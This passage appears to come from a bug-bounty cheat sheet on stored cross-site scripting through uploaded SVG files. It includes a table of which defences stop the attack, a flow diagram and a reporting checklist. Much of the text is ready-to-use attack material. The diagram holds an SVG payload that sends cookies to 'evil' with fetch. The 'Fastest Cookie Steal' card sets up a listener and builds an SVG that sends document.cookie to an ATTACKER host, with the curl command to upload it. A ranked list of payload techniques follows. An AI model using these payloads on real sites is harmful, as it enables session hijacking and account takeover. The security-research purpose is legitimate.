| CSP script-src 'self' | Allows same-origin scripts | Partial | If SVG is same-origin, scripts may execute |
| CSP script-src 'unsafe-inline' | Allows inline scripts | Yes | All SVG XSS payloads work |
| X-Content-Type-Options: nosniff | Prevents MIME sniffing | Blocks if wrong Content-Type served | Need correct Content-Type |
| Serving from different domain/CDN | SVG on separate origin | XSS fires but in CDN origin context | Cookie theft limited to CDN domain |
| Sandbox iframe | `<iframe sandbox>` | No JS unless `allow-scripts` | Limited impact |
| SVG to PNG conversion | Rasterizes before serving | No, script content destroyed | Target conversion bugs |

::

---

## Request Flow Diagram

::code-preview
```
┌─────────────────────────────────────────────────────────────┐
│                        ATTACKER                             │
│                                                             │
│  File: xss.svg                                              │
│  Content: <svg onload="fetch('https://evil/c?'+cookie)">    │
│  Content-Type: image/svg+xml                                │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│                   UPLOAD ENDPOINT                           │
│                                                             │
│  1. Receives multipart POST request                         │
│  2. Extracts filename: xss.svg                              │
│  3. Extension check: .svg → allowed image format ✓          │
│  4. Content-Type: image/svg+xml → valid image ✓             │
│  5. Magic bytes: <?xml or <svg → valid XML/SVG ✓            │
│  6. NO script content inspection                            │
│  7. Saves to: /uploads/xss.svg                              │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│                   FILE STORAGE                              │
│                                                             │
│  /uploads/xss.svg                                           │
│  Served with Content-Type: image/svg+xml                    │
│  No Content-Disposition: attachment header                  │
│  No Content-Security-Policy header                          │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│                VICTIM BROWSER                               │
│                                                             │
│  1. Attacker sends link: target.com/uploads/xss.svg         │
│  2. Browser requests the SVG file                           │
│  3. Server responds with Content-Type: image/svg+xml        │
│  4. Browser parses SVG as XML document                      │
│  5. Encounters onload="fetch(...)" attribute                │
│  6. EXECUTES JavaScript in target.com origin                │
│  7. Cookies, localStorage, sessionStorage accessible        │
│  8. Session token sent to attacker server                   │
│                                                             │
│  Impact: Stored XSS → Session Hijacking                     │
└─────────────────────────────────────────────────────────────┘
```

#code
```
Attacker uploads xss.svg → Server stores as image
→ Victim navigates to /uploads/xss.svg
→ Browser renders SVG + executes embedded JavaScript
→ Cookie/token exfiltrated to attacker
→ Session hijacked
```
::

---

## Bug Bounty Reporting Checklist

::field-group
  :::field{name="Proof of Upload" type="required"}
  Screenshot or HTTP request/response showing successful SVG upload with malicious content intact.
  :::

  :::field{name="Proof of Execution" type="required"}
  Screenshot of `alert(document.domain)` or equivalent demonstrating JavaScript execution in target origin context.
  :::

  :::field{name="Affected URL" type="required"}
  Direct URL to the uploaded SVG that triggers execution when accessed.
  :::

  :::field{name="Rendering Context" type="required"}
  How the SVG is rendered — direct navigation, iframe, embed, object, file preview, or inline embedding.
  :::

  :::field{name="Impact Demonstration" type="recommended"}
  Show cookie theft, session hijacking, or account takeover chain. Use `document.domain` and `document.cookie` in proof.
  :::

  :::field{name="Response Headers" type="recommended"}
  Include `Content-Type`, `Content-Disposition`, `CSP`, and `X-Content-Type-Options` headers of the served SVG.
  :::

  :::field{name="Origin Context" type="important"}
  Confirm whether SVG is served from the **same origin** as the application or a separate CDN/subdomain.
  :::

  :::field{name="Victim Interaction" type="important"}
  Specify if exploitation requires user interaction (clicking a link) or fires automatically (e.g., profile page loads SVG in embed/iframe).
  :::
::

---

## Quick Reference

::card-group
  :::card
  ---
  title: Fastest Proof-of-Concept
  ---
  ```bash
  # Create payload
  echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><rect width="1" height="1"/></svg>' > poc.svg

  # Upload
  curl -X POST https://target.com/upload \
    -F "file=@poc.svg" \
    -H "Cookie: session=TOKEN" -v

  # Verify execution — open in browser
  # https://target.com/uploads/poc.svg
  ```
  :::

  :::card
  ---
  title: Fastest Cookie Steal
  ---
  ```bash
  # Start listener
  python3 -c "from http.server import *;HTTPServer(('',8888),SimpleHTTPRequestHandler).serve_forever()" &

  # Create payload
  echo '<svg xmlns="http://www.w3.org/2000/svg" onload="new Image().src='\''http://ATTACKER:8888/?c='\''+document.cookie"><rect width="1" height="1"/></svg>' > steal.svg

  # Upload and share link with victim
  curl -X POST https://target.com/upload -F "file=@steal.svg"
  ```
  :::

  :::card
  ---
  title: Priority Payload Order
  ---
  1. `onload` on `<svg>` root element
  2. `<script>` tag with CDATA
  3. `<animate onbegin="">` 
  4. `<foreignObject>` with `<script>`
  5. `<foreignObject>` with `<img onerror="">`
  6. `<set onbegin="">`
  7. `<a xlink:href="javascript:">`
  8. `<image onerror="">`
  9. Base64 eval via `onload`
  10. Namespace/handler element tricks
  :::

  :::card
  ---
  title: Response Header Checks
  ---
  ```bash
  # Must see for XSS to work:
  Content-Type: image/svg+xml  ← REQUIRED
  # or
  Content-Type: application/xml
  Content-Type: text/xml

  # Must NOT see:
  Content-Disposition: attachment  ← blocks rendering
  Content-Type: text/plain         ← no SVG parsing
  Content-Type: image/png          ← no SVG parsing

  # CSP that blocks:
  Content-Security-Policy: script-src 'none'
  Content-Security-Policy: default-src 'none'

  # CSP that allows:
  Content-Security-Policy: script-src 'unsafe-inline'
  # or no CSP header at all
  ```
  :::
::